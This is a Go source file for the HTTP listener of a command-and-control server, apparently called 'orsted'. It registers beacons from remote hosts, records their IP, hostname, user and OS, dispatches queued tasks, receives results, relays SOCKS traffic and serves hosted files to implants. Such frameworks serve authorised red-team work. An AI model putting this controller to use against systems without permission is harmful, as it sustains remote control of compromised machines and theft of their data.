package listeners

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"google.golang.org/protobuf/encoding/protojson"

	"orsted/profiles"
	"orsted/protobuf/orstedrpc"
	"orsted/server/autoroute"
	"orsted/server/event"
	"orsted/server/handler"
	"orsted/server/orsteddb"
	"orsted/server/socks"
	"orsted/server/utils"
)

type BEACON_ID_JSON struct {
	Id string `json:"id"`
}

func RegisterBeacon(w http.ResponseWriter, r *http.Request) {
	utils.PrintInfo("Received Beacon Register Call")
	body, err := io.ReadAll(r.Body)
	if err != nil {
		utils.PrintDebug("Failed to read request body", err.Error())
		http.Error(w, "Failed to read request body", http.StatusInternalServerError)
		event.EventServerVar.NotifyClients("\nFailed Attempt to Register Beacon ... No Json")
		return
	}
	defer r.Body.Close()

	var envelope orstedrpc.Envelope
	if err := protojson.Unmarshal(body, &envelope); err != nil {
		utils.PrintDebug("Failed to unmarshal request envelope", err.Error())
		http.Error(w, "Failed to parse JSON", http.StatusBadRequest)
		event.EventServerVar.NotifyClients("\nFailed Attempt to Register Beacon ... Bad Json")
		return
	}

	utils.PrintDebug("Recieved Raw Envelope ", string(body))
	var sessionReq orstedrpc.SessionReq
	if err := protojson.Unmarshal(envelope.Data, &sessionReq); err != nil {
		utils.PrintDebug("Failed to unmarshal request envelope data", err.Error())
		http.Error(w, "Failed to parse JSON", http.StatusBadRequest)
		event.EventServerVar.NotifyClients("\nFailed Attempt to Register Beacon ... Bad Json")
		return
	}
	sessionReq.Chain = envelope.Chain

	s, err := orsteddb.RegisterSessionDB(&sessionReq)
	if err != nil {
		utils.PrintDebug("Error Register Beacon in DB", err.Error())
		event.EventServerVar.NotifyClients("\nFailed Attempt to Register Beacon ... DB Issue")
		return
	}
	message := fmt.Sprintf("\nBeacon From %s - %s - %s - %s", s.Ip, s.Hostname, s.User, s.Os)
	event.EventServerVar.NotifyClients(message)

	w.Header().Set("Content-Type", "application/json")
	var resp BEACON_ID_JSON
	resp.Id = s.Id

	res, _ := json.Marshal(resp)
	var EnvelopeToSend *orstedrpc.Envelope = &orstedrpc.Envelope{}
	EnvelopeToSend.Data = res
	EnvelopeToSend.Chain = envelope.Chain
	EnvelopeToSend.Id = s.Id
	EnvelopeToSend.Type = "respregbeacon"

	byteJson, err := protojson.Marshal(EnvelopeToSend)
	if err != nil {
		http.Error(w, "Failed to read request body", http.StatusInternalServerError)
		utils.PrintDebug("Error while marshelling enveloppe", err.Error())
		return
	}

	utils.PrintDebug("Will send following back to Beacon Register request", string(byteJson))
	w.Write(byteJson)
	if err != nil {
		http.Error(w, "Failed to parse JSON", http.StatusBadRequest)
		event.EventServerVar.NotifyClients("\nFailed Attempt to Register Beacon ... Bad Json")
		return
	}
	return
}

func SendTasksToBeacon(w http.ResponseWriter, r *http.Request) {
	utils.PrintDebug("Get Task Called by a beacon")
	defer r.Body.Close()

	var envelope orstedrpc.Envelope
	err := json.NewDecoder(r.Body).Decode(&envelope)
	if err != nil {
		utils.PrintDebug("Failed to read request body", err.Error())
		http.Error(w, "Failed to read request body", http.StatusInternalServerError)
		return
	}

	var bodyJson BEACON_ID_JSON
	err = json.Unmarshal(envelope.Data, &bodyJson)
	utils.PrintDebug("Body of Get Task called by Beacon", string(envelope.GetData()))
	if err != nil {
		utils.PrintDebug("Failed to unmarshal enveloppe Data", err.Error())
		http.Error(w, "Failed to read request body", http.StatusInternalServerError)
		return
	}

	err = orsteddb.UpdatePol(bodyJson.Id)
	if err != nil {
		utils.PrintDebug("Error Updating Beacon POL ", err.Error())
	}

	listTask, err := orsteddb.ListTasksDb(bodyJson.Id, []string{"pending"})
	if err != nil {
		http.Error(w, "Failed to read request body", http.StatusInternalServerError)
		utils.PrintDebug("Error while getting beacon task from db", err.Error())
		return
	}
	utils.PrintDebug("Listed Task for Beacon", listTask)

	byteJson, err := protojson.Marshal(listTask)
	if err != nil {
		http.Error(w, "Failed to read request body", http.StatusInternalServerError)
		utils.PrintDebug("Error while marshelling listed task for beacon", err.Error())
		return
	}

	// If we want to send evelope later
	var EnvelopeToSend *orstedrpc.Envelope = &orstedrpc.Envelope{}
	EnvelopeToSend.Data = byteJson
	if len(EnvelopeToSend.Chain) > 1 {
		EnvelopeToSend.Type = "p2p"
	} else {
		EnvelopeToSend.Type = "direct"
	}

	byteJson, err = protojson.Marshal(EnvelopeToSend)
	if err != nil {
		http.Error(w, "Failed to read request body", http.StatusInternalServerError)
		utils.PrintDebug("Error while marshelling Enveloppe", err.Error())
		return
	}

	for i := 0; i < len(listTask.Tasks); i++ {
		err = orsteddb.ChangeTaskState(listTask.Tasks[i].TaskId, "sent")
		if err != nil {
			utils.PrintDebug("Failed Changing Task State ", err.Error())
		}
	}
	w.Write(byteJson)
}

func ReceiveTaskResults(w http.ResponseWriter, r *http.Request) {
	utils.PrintDebug("A beacon sent result for a task")
	body, err := io.ReadAll(r.Body)
	if err != nil {
		utils.PrintDebug("Error Reading request body", err.Error())
		http.Error(w, "Failed to read request body", http.StatusInternalServerError)
		return
	}
	defer r.Body.Close()
	var envelope orstedrpc.Envelope
	if err := protojson.Unmarshal(body, &envelope); err != nil {
		utils.PrintDebug("Error in unmarshelling envelope", err.Error())
		http.Error(w, "Failed to parse JSON", http.StatusBadRequest)
		return
	}

	var taskRep orstedrpc.TaskRep
	if err := protojson.Unmarshal(envelope.Data, &taskRep); err != nil {
		utils.PrintDebug("Error in unmarshelling tasks", err.Error())
		http.Error(w, "Failed to parse JSON", http.StatusBadRequest)
		return
	}

	// Needed for download to know the first download
	oldState, err := orsteddb.GetTaskState(taskRep.TaskId)
	utils.PrintDebug("OldState Task for task ", taskRep.TaskId, oldState)
	if err != nil {
		utils.PrintDebug("Error in getting old state of task", err.Error())
		http.Error(w, "Cannot Send ", http.StatusBadRequest)
		return
	}

	t, err := orsteddb.SetTaskResponse(&taskRep)
	if err != nil {
		utils.PrintDebug("Error in setting task state", err.Error())
		http.Error(w, "Cannot Send ", http.StatusBadRequest)
		return
	}

	handler.HandleTask(t, oldState, envelope.Type)

	return
}

func SocksMessage(w http.ResponseWriter, r *http.Request) {
	utils.PrintDebug("Socks Message Called")
	defer r.Body.Close()

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Failed to read request body", http.StatusInternalServerError)
		return
	}

	utils.PrintDebug("Raw Socks Body:", string(body))

	var envelope orstedrpc.Envelope
	err = protojson.Unmarshal(body, &envelope)
	if err != nil {
		utils.PrintDebug("Error in unmarshelling Enveloppe", err.Error())
		http.Error(w, "Failed to read request body", http.StatusInternalServerError)
		return
	}

	utils.PrintDebug("Envelope Recived", fmt.Sprintf("Type: %s, Id: %s, Data:%s, Chain:%s", envelope.Type, envelope.Id, string(envelope.Data), envelope.Chain))

	res := socks.HandleSocksEnvelope(&envelope)
	byteJson, err := protojson.Marshal(res)
	if err != nil {
		utils.PrintDebug("Error in Marshelling Enveloppe", err.Error())
		http.Error(w, "Failed to read request body", http.StatusInternalServerError)
		return
	}
	w.Write(byteJson)

}


func HostEndpoint(w http.ResponseWriter, r *http.Request) {

	utils.PrintDebug("hostEndpoint Called")
	fileName := strings.TrimPrefix(r.URL.Path, profiles.Config.Endpoints["hostendpoint"])
	if fileName == "" {
		utils.PrintDebug("Error in file path, it is empty")
		http.Error(w, "Failed to rread rrequest body", http.StatusBadRequest)
		return
	}
	utils.PrintInfo(fmt.Sprintf("Requested File path to download is %s", fileName))
	rawBytes, err := orsteddb.GetFileDataDb(fileName)
	if err != nil {
		utils.PrintInfo("Error in getting file from DB, maybe not found", err.Error())
		http.Error(w, "Failed to rread rrequest body", http.StatusBadRequest)
		return
	}
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", `attachment; filename="`+fileName+`"`)
	w.WriteHeader(http.StatusOK)
	w.Write(rawBytes)
}

func addHttpHandler(mux *http.ServeMux) error {
	endpoints := profiles.Config.Endpoints
	mux.HandleFunc(endpoints["registerBeacon"], RegisterBeacon)
	mux.HandleFunc(endpoints["beaconTaskRetrieve"], SendTasksToBeacon)
	mux.HandleFunc(endpoints["beaconTaskResultSend"], ReceiveTaskResults)
	mux.HandleFunc(endpoints["socksMessage"], SocksMessage)
	mux.HandleFunc(endpoints["autorouteMessage"], autoroute.HandleAutorouteWebsocket)
	mux.HandleFunc(endpoints["hostendpoint"], HostEndpoint)
	return nil
}

type LISTENER_HTTP struct {
	Id   string
	Ip   string
	Port string
	Type string
	Srv  *http.Server
}

func NewHttpListener(id string, ip string, port string) *LISTENER_HTTP {
	s := LISTENER_HTTP{
		Id:   id,
		Ip:   ip,
		Port: port,
		Type: "http",
	}
	return &s
}
func (s *LISTENER_HTTP) StartListener() error {
	utils.PrintInfo("Starting HTTP Listener on server ", s.Ip, s.Port)
	mux := http.NewServeMux()
	addHttpHandler(mux)

	server := &http.Server{
		Addr:    s.Ip + ":" + s.Port,
		Handler: mux,
	}
	s.Srv = server
	err := s.Srv.ListenAndServe()
	if err != nil {
		utils.PrintInfo("Error in Serving HTTP Listener ", err.Error())
	}
	return err
}

func (s *LISTENER_HTTP) StopListener() error {
	utils.PrintInfo("Stopping HTTP Listener on server", s.Ip, s.Port)
	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
	defer cancel()
	return s.Srv.Shutdown(ctx)
}
func (s *LISTENER_HTTPS) GetListenerId() string {
	return s.Id
}
